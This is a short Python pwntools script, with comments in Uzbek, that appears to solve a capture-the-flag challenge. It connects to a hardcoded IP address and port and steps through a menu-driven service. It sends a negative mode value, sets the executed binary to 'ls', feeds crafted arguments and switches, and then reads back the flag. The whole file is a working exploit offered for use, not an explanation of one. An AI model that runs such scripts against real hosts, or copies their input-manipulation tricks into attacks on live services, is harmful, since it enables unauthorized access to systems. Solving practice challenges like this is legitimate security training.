from pwn import *

# Server ma'lumotlari
host = '154.57.164.68'
port = 31363

def solve():
    try:
        # Serverga ulanamiz
        r = remote(host, port, timeout=5)
        
        # 1. Mode o'rnatish
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'(mode)> ', b'-1')
        
        # 2. Bin o'rnatish: 'sh' (yoki 'ls')
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'(bin)> ', b'ls')
        
        # 3. Argumentlarni yuborish
        # 1-argument: mavjud narsa (rc=1 yoki 0)
        # 2-argument: mavjud bo'lmagan narsa (rc=2)
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'(arg1,arg2)> ', b'.,/x') 
        
        # 4. Switchlarni yuborish
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'(switch1,switch2)> ', b'.,.')
        
        # 5. Beat the competitor!
        r.sendlineafter(b'> ', b'5')
        
        # Natijani o'qiymiz
        # recvall o'rniga r.recvline() yoki r.recv() ishlatamiz
        print(r.recvuntil(b'}').decode()) # Flag odatda } bilan tugaydi
        
    except Exception as e:
        print(f"\n[!] Xatolik: {e}")
    finally:
        r.close()

if __name__ == "__main__":
    solve()
